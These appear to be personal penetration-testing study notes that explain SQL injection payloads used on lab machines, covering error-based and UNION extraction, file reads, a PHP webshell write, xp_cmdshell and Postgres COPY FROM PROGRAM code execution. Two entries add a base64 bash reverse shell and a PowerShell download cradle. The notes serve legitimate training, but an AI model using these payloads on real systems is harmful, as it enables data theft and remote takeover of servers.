
# SQL Injection, Command Breakdowns

Full teardowns of the SQLi payloads used across [[SQL Injection Attacks]] and the boxes that reused them. See [[COMMAND BREAKDOWNS]] for the entry format and what this file is for.

---

## Error-based extraction via `extractvalue()` on a POST field

**Full command:**
```bash
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='subscribers')))-- -" http://192.168.156.48/index.php | grep -i "XPATH"
```

**Piece by piece:**

- `curl -s` → silent mode. Without it, curl prints its own progress meter to stdout mixed in with the actual response, which would pollute the `grep` at the end. `-s` gives you just the raw response body.
- `-X POST` → the vulnerable form (`<form method="POST">`) submits this way, found by viewing page source on the target's homepage. If you send a GET instead, the request never reaches the code path handling this field at all, no error, just a normal page back.
- `--data "mail-list=..."` → curl's shorthand for sending an `application/x-www-form-urlencoded` body. The key (`mail-list`) has to match the form field's `name="mail-list"` attribute *exactly*, again pulled from viewing source (`curl http://target/ | grep -i "input\|form"`, or just Ctrl+U in a browser).
- `test'` → `test` is a normal-looking value for whatever field this is (the app probably expects an email or a name). The trailing `'` is the actual attack: the backend almost certainly builds a query like `INSERT INTO subscribers (email) VALUES ('$input')`, and this quote closes that string literal early, so everything after it gets parsed as real SQL instead of as data.
- `AND` → glues our injected expression onto the now-open string context so the whole thing stays one evaluatable expression: `'test' AND extractvalue(...)`. MySQL evaluates this left to right, but it never actually gets to finish, see the next point.
- `extractvalue(1, concat(0x7e, (SELECT ...)))` → this is the actual trick. `extractvalue(doc, xpath)` is a real MySQL XML function that expects a valid XPath string as its second argument. Feed it garbage (anything starting with `~` isn't valid XPath) and MySQL throws an error *and prints the invalid string back to you inside the error message*. That's the whole exploit: turn "give me data" into "make MySQL accidentally echo the data back inside its own error text."
  - `1` → the first argument (the XML doc to search) is irrelevant, we never get that far before it errors out. `1` is just a cheap valid placeholder.
  - `concat(0x7e...)` → glues a `~` (hex `0x7e`, used instead of a literal `~` so it survives URL-encoding cleanly through curl's `--data`) onto the front of the subquery's result. The `~` is just a visual/grep-able marker so you can tell where the real data starts in the error text, separate from MySQL's own boilerplate wording.
  - `(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='subscribers')` → the actual payload. `information_schema.columns` is MySQL's built-in metadata table, every column of every table you can see is a row in it. `group_concat()` mashes all the matching rows into one comma-separated string, because `extractvalue()` can only smuggle out a single string per call, there's no way to get multiple rows back one at a time here the way a UNION dump would.
- `-- -` → a SQL line comment. `--` needs a trailing space to count as a comment start in MySQL, and that space often gets silently trimmed by whatever's between you and the database (URL decoding, PHP, etc.), so the extra dummy `-` guarantees a real space survives before it. This comments out whatever the original query template had left over after our injection point (the closing `')` and any trailing SQL), so the statement still parses even though we never supplied a matching quote/paren ourselves.
- `| grep -i "XPATH"` → the server doesn't return anything structured (no JSON, no clean error page), it returns the *entire normal HTML page* with the raw MySQL error text dumped in wherever the form-handling PHP's uncaught exception happens to get echoed. That's one line buried in a page full of `<div>`s, CSS, nav bars, etc. `grep -i "XPATH"` is what actually finds it, MySQL's error for this always contains the literal string `XPATH syntax error`, case can vary slightly by version hence `-i`.

**Caveat:** `extractvalue()` (and its sibling `updatexml()`) truncates the returned string to 32 characters total, marker included. Longer values need to be paged with `substring((SELECT ...), start, 31)`, bumping `start` by 31 each call. See [[SQL Injection Attacks#Capstone: Exercise VM #2|Capstone VM #2]] step 9 for this in use against `LOAD_FILE()` output.

**Where this comes from:** PortSwigger's SQL Injection Cheat Sheet has this under its "Extracting data via error messages" section (search page for `extractvalue`). HackTricks (book.hacktricks.xyz → Pentesting Web → SQL Injection page) has a MySQL-specific "Error based" section with this exact pattern and the 32-char truncation note. PayloadsAllTheThings' `SQL Injection/` folder has ready-to-copy templates for both `extractvalue` and `updatexml` if one gets filtered by a WAF.
> 🔗 Full technique writeup: HackTricks · 🔗 Payload/bypass reference: PayloadsAllTheThings

**Where to look in the response:** don't assume the error comes back "clean." It's stitched into the same HTML the homepage normally returns, so eyeballing it in a browser means scrolling past the whole page looking for one out-of-place sentence. Worth doing once with `curl -s ... | less` (or Burp's Response tab) just to *see* it sitting there mid-page and build that mental picture, then defaulting to `grep -i "XPATH"` (or whatever your DB engine's error keyword is, e.g. `"error in your SQL syntax"` for a plain syntax error) every time after that so you're not scanning HTML by eye.

🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #2|SQL Injection Attacks, Capstone VM #2]], steps 7-9. Same underlying idea as the [[SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|10.2.1 error-based section]], just against an `INSERT` instead of a `SELECT`, and manual instead of sqlmap.

#### Tags: #SQLInjection #ErrorBased #MySQL #CommandBreakdowns

---

## Error-based extraction via a type-mismatch inside `IN`

**Full command:**
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

**Piece by piece:**
- `'` → same string-breakout as every other entry here, closes the app's own quote early.
- `or 1=1 in (...)` → the actual trick, and a *different* error mechanism than `extractvalue()`. `IN` expects to compare a value against a *list*. Feeding it a boolean (`1=1`, which MySQL treats as the integer `1`) against a subquery that's built to only return a single column forces a type/arity mismatch, and MySQL's own error text for that mismatch often echoes the offending value straight back to you.
- `(SELECT password FROM users WHERE username = 'admin')` → the subquery has to return exactly **one column**. Try `SELECT *` here and it errors with "subquery returns more than 1 column" before it ever gets to leak anything, that's the tell that you've over-asked, not that the technique is broken.
- `-- //` → same comment-out-the-rest trick as the auth bypass payload, `//` is just a human-readable marker, not required syntax.

**Where this comes from:** PortSwigger's SQL Injection Cheat Sheet lists this under "Retrieving data via error-based data extraction" as an alternative to `extractvalue()`, useful when a WAF filters one but not the other. HackTricks' MySQL injection page also covers `IN`-based type-confusion errors alongside the XML-function tricks.

**Where to look in the response:** unlike the `extractvalue()` case, this one is version/config dependent, some MySQL configurations show the full "Subquery returns more than 1 row" or "Operand should contain 1 column(s)" style error with the value inline, others just show a generic failure. Test it against a known-value subquery first (e.g. `select @@version`) so you know what a *working* leak actually looks like on this specific target before trusting it against unknown data.

🔁 **Seen in:** [[SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|SQL Injection Attacks, 10.2.1]], steps 4-7.

#### Tags: #SQLInjection #ErrorBased #MySQL #CommandBreakdowns

---

## UNION-based enumeration: column count → safe placement → schema discovery

**Full command sequence:**
```
' ORDER BY 1-- //
' ORDER BY 6-- //
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
' UNION SELECT null, null, database(), user(), @@version -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

**Piece by piece:**
- `' ORDER BY 1-- //`, incrementing → this isn't about sorting, it's a **column-count probe**. `ORDER BY <N>` errors if column `N` doesn't exist in the result set. Increment until it breaks, the last number that *didn't* error is the real column count. Cheaper than guessing `UNION SELECT null,null...` combinations by hand.
- `UNION SELECT 'a1','a2'...` → once you know the count, inject a placeholder string per column and see which ones actually render on the page. A column that's fetched but never displayed (e.g. used only internally) is a dead end for exfiltration even if the UNION itself succeeds.
- Two different column orderings for the same enumeration query (`database(), user(), @@version, null, null` vs `null, null, database(), user(), @@version`) → this is the type-compatibility rule in action. `UNION` requires column types to line up position-by-position with the original query. If column 1 is normally an integer ID, dropping a string function there doesn't throw an error, it just **silently fails to display**, which is a much sneakier failure mode than a visible error. Fix is mechanical: shift your functions to whichever column positions are confirmed text-rendering from the placeholder step above.
- `information_schema.columns where table_schema=database()` → the schema-discovery step, and it's deliberately DBMS-generic. `information_schema` is MySQL's built-in metadata catalog (every SQL-92-compliant DBMS has an equivalent), so this exact query pattern works against any target regardless of what the actual app's tables are called, no prior knowledge needed.

**Where this comes from:** PortSwigger's "SQL injection UNION attacks" page has the canonical column-count/compatible-types explanation. PayloadsAllTheThings' `SQL Injection/` README has ready `ORDER BY`/`UNION SELECT` probing templates per DBMS if the exact syntax needs adjusting for Postgres/MSSQL instead of MySQL.

**Where to look in the response:** don't just check for an error, check for **silent absence**. A column that should show your placeholder but doesn't isn't necessarily broken, it's often a type mismatch quietly swallowing your output. Compare the full rendered page against a known-good baseline request side by side rather than assuming "no error" means "it worked."

🔁 **Seen in:** [[SQL Injection Attacks#10.2.2. UNION-Based Payloads|SQL Injection Attacks, 10.2.2]], steps 1-4.

#### Tags: #SQLInjection #UnionSQLi #MySQL #CommandBreakdowns

---

## `LOAD_FILE()` chained through `extractvalue()` for arbitrary file read

**Full command:**
```bash
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/var/www/flag.txt')),1,31)))-- -" http://192.168.156.48/index.php | grep -i "XPATH"
```

**Piece by piece:** everything up to the innermost subquery works exactly like the [[SQL Injection (Breakdowns)#Error-based extraction via extractvalue() on a POST field|main extractvalue() entry]] above, this is that same exfiltration channel repurposed to leak file contents instead of table data.
- `LOAD_FILE('/var/www/flag.txt')` → a plain MySQL function that reads a file straight off the **database server's own filesystem**, nothing to do with the injection point itself. It's a completely separate primitive being smuggled through the same error-message channel. Needs the connected MySQL user to have the `FILE` privilege, and `secure_file_priv` to be either empty or pointed at a directory that covers the target path (both worth checking with `SELECT current_user()` / `SELECT @@secure_file_priv` before spending time on this).
- `substring((SELECT ...), 1, 31)` → exists purely because of `extractvalue()`'s 32-character output cap (31 characters of real data plus the 1-character `~` marker). Long files have to be read in 31-byte windows, incrementing the start offset (`1`, `32`, `63`...) across multiple requests and concatenating the results yourself afterward.

**Where this comes from:** HackTricks' MySQL injection page covers `LOAD_FILE()` as the standard MySQL file-read primitive once `FILE` privilege is confirmed, right next to the `extractvalue()`/`updatexml()` error-based section, they're written to be combined exactly like this.

**Where to look in the response:** same as the parent entry, grep for the DB engine's error marker (`XPATH syntax error` for MySQL's XML functions). The payload here is longer, so double-check the response isn't getting truncated somewhere between curl and your terminal (redirect to a file with `-o` instead of piping through `grep` if a result ever looks suspiciously short).

🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #2|SQL Injection Attacks, Capstone VM #2]], step 9.

#### Tags: #SQLInjection #ErrorBased #FileRead #LoadFile #CommandBreakdowns

---

## MySQL webshell write via `UNION ... INTO OUTFILE`

**Full command:**
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

**Piece by piece:**
- `UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null` → a normal UNION payload (same column-count/type rules as the enumeration entry above), except the value being selected isn't data you want back, it's a complete PHP webshell, written as a plain string literal.
- `INTO OUTFILE "/var/www/html/tmp/webshell.php"` → the actual exploit. This is a real MySQL clause (usually used to export query results to a CSV-style file) repurposed to dump the UNION'd string directly onto disk at an attacker-chosen path. It only works if the OS user running the MySQL process has write permission to that directory, there's no SQL-level access control stopping you otherwise.
- Why the app's response still shows an error even though this works → the original query's other columns almost certainly don't type-match a raw PHP string, so the app throws its usual type-mismatch error same as any bad UNION payload. That error is cosmetic, the file write happens at the database layer *before* the app tries (and fails) to render the result, so ignore the visible failure and go check whether the file landed.
- `MySQL never overwrites an existing file at that path` (not shown in this line, but load-bearing): if `INTO OUTFILE` throws `File already exists`, that's not the payload failing, it's a target-path collision, just change the filename in the query.

**Where this comes from:** HackTricks' "MySQL File Priv to SSRF/RCE" section documents `INTO OUTFILE` as the standard privilege-permitting write primitive for MySQL, with the same `FILE` privilege + writable-directory prerequisites as `LOAD_FILE()` above (it's the write-side counterpart). PayloadsAllTheThings has ready PHP one-liner webshell strings if you want something more capable than a bare `system()` call.

**Where to look in the response:** the app's own HTTP response will look like a failure (a type-mismatch error page), that's expected and not a signal either way. The real confirmation is a separate request straight to the file you wrote, e.g. `curl "http://<target>/tmp/webshell.php?cmd=id"`, treat the UNION request and the confirmation request as two independent checks.

🔁 **Seen in:** [[SQL Injection Attacks#10.3.1. Manual Code Execution|SQL Injection Attacks, 10.3.1]] (MySQL section), and its companion [[SQL Injection & Databases|Command Appendix's SQL Injection Payloads]] entry.

#### Tags: #SQLInjection #IntoOutfile #MySQLWebshell #CommandBreakdowns

---

## MSSQL `xp_cmdshell` two-stage enable chain

**Full command:**
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

**Piece by piece:**
- `sp_configure 'show advanced options', 1` → `xp_cmdshell` is classified as an **advanced** server option, and MSSQL hides advanced options from `sp_configure` entirely by default as a safety rail. This first call doesn't touch `xp_cmdshell` at all, it just makes the advanced option list visible/settable in the first place.
- `RECONFIGURE` (both times) → `sp_configure` only stages a change, it doesn't apply it. `RECONFIGURE` is the separate command that actually commits the staged value. Forget it and the next `sp_configure` call for `xp_cmdshell` will fail or silently not take effect.
- `sp_configure 'xp_cmdshell', 1` → now that advanced options are visible, this is the actual switch that turns the feature on. Two calls, two commits, because it's gated behind the option-visibility flag first.
- `EXECUTE xp_cmdshell 'whoami'` → note `EXECUTE`, not `SELECT`. `xp_cmdshell` is an **extended stored procedure**, not a function or table, so it's invoked like any other stored procedure. It runs the string as a literal OS command under the SQL Server service account and returns stdout as result rows.

**Where this comes from:** Microsoft's own docs for `xp_cmdshell` describe the advanced-options gating explicitly. HackTricks' MSSQL injection page has this exact two-`sp_configure`-calls-plus-`RECONFIGURE` sequence as the standard enable chain, and covers the fallback (`sp_oacreate`/CLR-based execution) for when `xp_cmdshell` is blocked entirely by policy.

**Where to look in the response:** once enabled, `xp_cmdshell`'s output comes back as normal query result rows (one row per line of stdout), no special parsing needed, it looks just like any other `SELECT` result set in whatever client you're using (`impacket-mssqlclient`, `sqlcmd`, or through a SQLi channel).

🔁 **Seen in:** [[SQL Injection Attacks#10.3.1. Manual Code Execution|SQL Injection Attacks, 10.3.1]] (MSSQL section), and its companion [[SQL Injection & Databases|Command Appendix]] entry.

#### Tags: #SQLInjection #XpCmdshell #MSSQL #CommandBreakdowns

---

## sqlmap: forcing a technique and automating the webshell drop

**Full commands:**
```bash
sqlmap -u "http://192.168.245.19/search.php" --data="item=test" -p item --batch --technique=T -T users --dump
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```

**Piece by piece:**
- `--technique=T` → sqlmap's discovery scan often finds a target injectable through *multiple* techniques at once (boolean, error, UNION, time all working simultaneously isn't unusual on an app with zero sanitization). Left alone, sqlmap picks whichever it judges fastest, usually UNION when it's available. `--technique=T` overrides that and forces **T**ime-based blind specifically, useful for deliberately practicing the slow technique, or when the fast ones get blocked by a filter but timing doesn't. Letter codes: `B`=boolean, `E`=error, `U`=union, `S`=stacked queries, `T`=time, `Q`=inline queries.
- `-T users --dump` → without `-T`, `--dump` pulls every table in the current database. Naming one table scopes it down, meaningfully faster against a slow technique like time-based blind where every character costs a full timing probe.
- `-r post.txt` → reads a complete saved HTTP request (captured via Burp) instead of sqlmap constructing one from a `-u`/`--data` pair. Necessary once a request has anything nonstandard (custom headers, cookies, a CSRF token) that a bare URL+data string can't represent.
- `--os-shell --web-root "/var/www/html/tmp"` → this is the manual `UNION ... INTO OUTFILE` webshell trick from the entry above, fully automated. `--web-root` tells sqlmap which server-side directory maps to a URL it can reach afterward, sqlmap still needs *you* to have already found a writable, web-accessible path, it doesn't discover that on its own. Once it uploads its stager, you land directly in an interactive `os-shell>` prompt, no manual `curl ...?cmd=` round-tripping needed.

**Where this comes from:** sqlmap's own `--help` output documents every technique letter and flag. HackTricks' sqlmap cheat sheet page is the fastest reference for flag combinations by scenario (WAF bypass tampers, `--os-shell` prerequisites, etc) without reading the full options list each time.

**Where to look in the response:** sqlmap prints its own structured output (technique confirmed, DBMS fingerprint, dumped rows in a table) directly to the terminal, no response-scraping needed on your end, that's the whole point of automating it. The one thing worth watching for manually is the **prompt for backend language** (PHP/ASP/ASPX/JSP) during `--os-shell`, get that wrong and the stager it writes won't execute even though the file upload itself succeeds.

🔁 **Seen in:** [[SQL Injection Attacks#10.3.2. Automating the Attack|SQL Injection Attacks, 10.3.2]].

#### Tags: #SQLInjection #Sqlmap #CommandBreakdowns

---

## PostgreSQL error-based extraction via `CAST()` type-mismatch

**Full command:**
```bash
curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT version()) AS int),NULL,NULL,NULL,NULL-- &age=25&gender=Male&email=test@test.com" http://192.168.170.49/class.php | grep -iE "warning|error"
```

**Piece by piece:**
- `x%'` → closes out the injection point cleanly. The backend wraps the input as `'%<value>%'` (a `LIKE` pattern), so the injected value needs to supply its own `%'` to close that string before real SQL can follow, the leading `x` is just a throwaway placeholder, its content doesn't matter.
- `UNION SELECT NULL,CAST(...) AS int),NULL,NULL,NULL,NULL` → a standard UNION payload (same column-count/type rules as MySQL's, see [[SQL Injection (Breakdowns)#UNION-based enumeration: column count → safe placement → schema discovery|the UNION entry above]]), except column 2 is deliberately targeted because earlier probing confirmed it's integer-typed in the real query.
- `CAST((SELECT version()) AS int)` → this is the actual exploit, and it's a different mechanism than MySQL's `extractvalue()` even though the *result* (leak a value through an error message) is identical. Postgres doesn't need an XML-parsing trick, it's strongly typed enough that trying to force a text result into an integer at runtime is itself an error, and critically, **Postgres includes the actual offending value in that error's text** (`invalid input syntax for type integer: "<value>"`). No marker character, no truncation cap, the whole string comes back verbatim.
- `-- ` → comments out the trailing `%'` the original template would otherwise append, exactly the same reasoning as every other entry on this page.
- `| grep -iE "warning|error"` → the app dumps PHP's raw `pg_query()` warning directly into the page body (visible as `<b>Warning</b>: pg_query(): Query failed...`), same "error text buried in a normal-looking page" situation as the MySQL entries, just with different marker words to grep for.

**Where this comes from:** HackTricks' PostgreSQL Injection page has a dedicated "Error Based" section covering `CAST()` (and the equivalent `::int` shorthand) as the standard Postgres error-leak primitive. PayloadsAllTheThings' SQL Injection folder has a PostgreSQL-specific payload file with more type-confusion variants (date, boolean, etc) if `int` ever gets filtered.

**Where to look in the response:** same pattern as the MySQL entries, grep the full HTML response for the error keyword rather than reading the page by eye. One genuine advantage over MySQL's `extractvalue()`: **no 32-character truncation**, a `string_agg()` of an entire table can come back in a single request instead of needing `LIMIT`-based row-by-row paging.

🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], steps 8-10.

#### Tags: #SQLInjection #ErrorBased #PostgreSQL #CommandBreakdowns

---

## PostgreSQL RCE via `COPY ... FROM PROGRAM` (superuser only)

**Full commands:**
```bash
curl -s -X POST --data "weight=70&height=x'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; -- &age=25&gender=Male&email=test@test.com" http://192.168.170.49/class.php

curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output, ' | ')) AS int),NULL,NULL,NULL,NULL FROM cmd_exec-- &age=25&gender=Male&email=test@test.com" http://192.168.170.49/class.php | grep -iE "warning|error"
```

**Piece by piece:**
- The privilege check that gates this entirely (not shown in the command, but load-bearing): `COPY ... FROM PROGRAM` only works for a Postgres **superuser** role. Confirmed beforehand via `SELECT usesuper FROM pg_user WHERE usename = current_user`, this is Postgres' direct equivalent of MSSQL needing `sysadmin` before `xp_cmdshell` will run (see [[SQL Injection (Breakdowns)#MSSQL xp_cmdshell two-stage enable chain|that entry]]), same underlying idea (a privileged DB role can reach the OS), different DBMS-specific gate.
- `x'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; -- ` → this is a **stacked query**, multiple complete SQL statements separated by `;` in a single injected string, not a single UNION. It only works here because the backend calls PHP's `pg_query()`, which executes every `;`-separated statement it's given in one call. (MySQL's equivalent, `mysqli_query()`, does NOT do this by default, it needs `mysqli_multi_query()` explicitly, which is why stacked-query injection is far more commonly exploitable against Postgres/MSSQL backends than MySQL ones.)
- `CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text)` → sets up a landing spot. `COPY FROM PROGRAM` needs an existing table to write into, it can't create one implicitly.
- `COPY cmd_exec FROM PROGRAM 'id'` → the actual RCE primitive. `COPY` is normally a bulk-data-loading command (import a CSV into a table), and `FROM PROGRAM` is a legitimate Postgres feature that lets the *data source* be a shell command's stdout instead of a file, each line of output becomes one row. Superuser-gated for exactly this reason, it's a designed feature being used exactly as designed, just against a database whose superuser role a web app should never have been running as.
- Why the output isn't visible in the first request's response → `COPY FROM PROGRAM` has no return channel back to the SQL client, it just populates the table silently. Getting the command's output back out requires a **second, separate request** that reads `cmd_exec` through the same `CAST()`-error leak channel used for data extraction elsewhere on this page.

**Where this comes from:** this exact `CREATE TABLE` + `COPY FROM PROGRAM` + read-back pattern is documented on HackTricks' PostgreSQL pentesting page under "RCE with PostgreSQL Command Execution," listed as the modern replacement for the older (and since-patched) `lo_import`/large-object RCE tricks. PayloadsAllTheThings' PostgreSQL Injection page covers the stacked-query prerequisite explicitly.

**Where to look in the response:** the first (setup) request typically returns silently, a normal-looking page with no error, that's success, not failure, since `COPY FROM PROGRAM` doesn't echo anything back directly. Confirmation only comes from the follow-up read-back request, grep that one for the error-marker text same as every other entry here.

🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], steps 11-12.

#### Tags: #SQLInjection #PostgreSQL #RCE #StackedQueries #CommandBreakdowns

---

## Why a base64 payload sent via `curl --data` silently corrupts (`+` becomes a space)

**Full command (the broken version):**
```bash
curl -X POST --data "height=x'; COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMi80NDQ0IDA+JjEgJiI= | base64 -d | bash'; -- " http://<target>/class.php
```
**Fixed version:**
```bash
curl -X POST --data-urlencode "height=x'; COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMi80NDQ0IDA+JjEgJiI= | base64 -d | bash'; -- " http://<target>/class.php
```

**Piece by piece:**
- Why base64 the reverse shell at all → the raw payload has quotes nested three layers deep (shell string, SQL string literal, HTTP form value), base64-encoding it collapses all of that into one clean alphanumeric-plus-`+/=` string with no characters that could break out of any of those layers early.
- Why the base64 itself broke → `curl --data` sends the value **exactly as typed**, with no encoding applied. The HTTP `Content-Type` for a plain `--data` POST is `application/x-www-form-urlencoded`, a format where a literal `+` character is a **reserved meta-character meaning "space"** (this is why URLs use `+` for spaces in query strings). Base64's alphabet includes `+` as a normal output character, standard base64 output routinely contains it. Since curl doesn't encode the value, any `+` in the base64 string arrives at the server having already been silently reinterpreted as a space by the time PHP decodes the POST body, corrupting the payload before it's even base64-decoded.
- `--data-urlencode` → percent-encodes the entire value before sending (`+` becomes `%2B`, along with every other reserved character), so it survives the round trip intact. This is the general fix, the same one already needed for the `&` characters in a plain bash reverse shell one-liner back in [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]'s troubleshooting note, both are instances of the same root cause: `--data` sends raw, `--data-urlencode` doesn't.

**Where this comes from:** curl's own man page documents `--data` as sending the value "exactly as specified" versus `--data-urlencode`, which "is the same as --data, except that this performs URL-encoding." RFC 1866 (the original HTML form-encoding spec) defines `+` as the encoded form of a space within `application/x-www-form-urlencoded` bodies, general web-fundamentals knowledge rather than an OSCP-specific trick, but one that bites reverse-shell delivery constantly since so many payloads end up base64 or otherwise `+`-containing.

**Where to look in the response:** if a payload that looks correct locally produces a garbled/nonsensical error on the target (like a base64 string with gaps where `+` should be, or a shell command failing with a syntax error that doesn't match what was sent), diff the sent value character-by-character against what the server's error message echoes back, rather than assuming the technique itself is wrong.

🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #3|SQL Injection Attacks, Capstone VM #3]], Step 13.

#### Tags: #ReverseShell #DataUrlencode #CommandBreakdowns

---

## Why stacked-query errors silently vanish while the query still executes

**The diagnostic commands (not a payload to copy, a troubleshooting sequence):**
```bash
# 1. Prove the query executes at all, via a measurable side effect (timing), not error text
offsec'; WAITFOR DELAY '0:0:5'-- 

# 2. Try to read data back via a stacked statement's error (this silently fails)
offsec'; DECLARE @out TABLE(line varchar(8000)); INSERT INTO @out EXEC xp_cmdshell 'whoami'; SELECT CONVERT(int,(SELECT TOP 1 line FROM @out))-- 

# 3. Rule out "my command was wrong" with a guaranteed, unconditional error
offsec'; SELECT 1/0-- 
```

**Piece by piece:**
- `WAITFOR DELAY '0:0:5'` as a stacked statement → this is a control, not the actual exploit. It proves the SQL Server genuinely executes every statement in the batch (the request really did take ~5 seconds longer), completely independent of whether the *application* ever surfaces a result or error from that statement back to the HTTP response. Timing is a side channel that doesn't route through the app's error-handling code at all, it just requires the database itself to actually pause.
- The `CONVERT()`-based read-back attempt (step 2) → structurally correct (same pattern that worked fine against Postgres in [[SQL Injection (Breakdowns)#PostgreSQL error-based extraction via CAST() type-mismatch|Capstone VM #3]]), but produced no visible error at all.
- `SELECT 1/0` (step 3) → the control that isolates *where* the problem is. A guaranteed, unconditional, data-independent runtime error (division by zero always fails, no subquery, no privilege dependency, nothing that could go wrong except the division itself). If even this doesn't surface, the problem definitively isn't the specific `CONVERT()`/privilege logic, it's that **the application never reads or displays anything from statements after the first one in the batch at all**. Likely explanation: the ADO.NET code only calls `ExecuteReader()` and reads the first result set (checking for a matching login row), and never calls `SqlDataReader.NextResult()` to advance through the rest of the batch, so whatever happens in later statements, success or failure, never reaches the code path that populates the error label.
- The practical consequence → error-based extraction (leaking data through exception text) only works for things that can be expressed inside the **first** statement of the injection (no `;`, via `UNION`/subquery tricks). Anything requiring a stacked statement (enabling `xp_cmdshell`, running arbitrary commands) has to be done **blind**, verified by an out-of-band signal (a caught reverse shell, a DNS/HTTP callback, a timing difference) rather than by reading a return value back through the app's own response.

**Where this comes from:** this isn't a documented "technique" on any cheat site, it's a debugging methodology: isolate a suspected failure with a control that can only fail one specific way (`1/0` for "does any error at all surface past the first statement"), the same instinct as adding a `console.log` at the narrowest possible point when debugging code. Worth applying generally: whenever a "should have errored" payload doesn't, test with the simplest possible guaranteed-error version before concluding the specific technique (not the whole channel) is broken.

**Where to look in the response:** nothing to grep for here, that's the finding, the *absence* of any exception text (even for a guaranteed `1/0`) is itself the diagnostic signal. Once confirmed, stop trying to read stacked-query results through the HTTP response and switch to an out-of-band confirmation method instead.

🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #4|SQL Injection Attacks, Capstone VM #4]], Steps 7-9.

#### Tags: #MSSQL #StackedQueries #DebuggingMethodology #CommandBreakdowns

---

## Triple-nested quoting for `xp_cmdshell` → `cmd.exe` → PowerShell download cradle

**Full command (the T-SQL fragment sent as the injected username):**
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ip>/shell.ps1'')"'-- 
```

**Piece by piece, working from the inside out (three separate languages, three separate quoting rules, all nested in one string):**
- Innermost: `New-Object Net.WebClient).DownloadString('http://<ip>/shell.ps1')` → plain PowerShell, a **download cradle**, fetch a script's text over HTTP and hand it to `IEX` (`Invoke-Expression`) to execute it in memory, no file ever touches disk. PowerShell string literals use single quotes here.
- Middle layer: `powershell -c "IEX(...)..."` → this whole PowerShell command needs to be passed as **one argument** to `cmd.exe` (which is what `xp_cmdshell` actually invokes under the hood). `cmd.exe` uses **double quotes**, not single quotes, to group an argument containing spaces, so the entire PowerShell command gets wrapped in `"..."` for `cmd.exe`'s sake. This is why the string now has both single quotes (PowerShell's) and double quotes (cmd.exe's) *coexisting*, they belong to two different parsers reading the same characters at two different stages.
- Outermost: `EXEC xp_cmdshell '...'` → the whole `powershell -c "..."` string is itself a **T-SQL string literal**, delimited by single quotes, being passed as `xp_cmdshell`'s one argument. T-SQL's escaping rule for a literal single quote *inside* a single-quoted string is to **double it** (`''`), not backslash-escape it, that's why the PowerShell URL's surrounding quotes appear as `''http://<ip>/shell.ps1''` instead of `\'...\'`, each `''` is T-SQL's way of saying "one literal `'` character here, not the end of the string."
- Why the double quotes (cmd.exe's) never needed escaping for T-SQL → because T-SQL's string delimiter is the single quote, not the double quote, so a `"` character inside a T-SQL string is just an ordinary character to the parser, no special handling needed at that layer.
- One more layer in practice, not shown above: since this entire T-SQL fragment is itself the value of an HTTP form field being sent via `curl --data-urlencode`, it also has to survive being embedded inside a **bash double-quoted string** on the attacking machine, meaning the literal `"` characters (cmd.exe's) need a bash backslash-escape (`\"`) so bash doesn't treat them as ending its own string early. Four layers of quoting rules, stacked, each one only caring about its own delimiter character.

**Where this comes from:** this exact `xp_cmdshell` → `cmd.exe "..."` → PowerShell `-c` download-cradle pattern is a standard MSSQL-to-RCE chain, documented on HackTricks' MSSQL Injection page and in many public SQLi-to-shell writeups. The specific insight (which quote belongs to which layer, and why doubling vs backslash-escaping) isn't usually spelled out explicitly, most references just give the final string to copy, this breakdown exists because getting even one layer wrong (e.g. backslash-escaping instead of doubling the T-SQL quotes) produces a confusing syntax error that looks like it's coming from the wrong layer entirely.

**Where to look in the response:** nothing to look for in the HTTP response, per the entry above, stacked-statement results/errors don't surface on this app at all. Confirmation is entirely out-of-band: a `GET /shell.ps1` hit on your Python HTTP server's log, followed by a connection on your `nc` listener. If the web server never gets hit, suspect a quoting mismatch (one layer's delimiter leaking into another) breaking the command before it ever runs, rather than a network/firewall issue.

🔁 **Seen in:** [[SQL Injection Attacks#Capstone: Exercise VM #4|SQL Injection Attacks, Capstone VM #4]], Step 10.

#### Tags: #MSSQL #XpCmdshell #PowerShell #DownloadCradle #QuotingEscaping #CommandBreakdowns

---

---

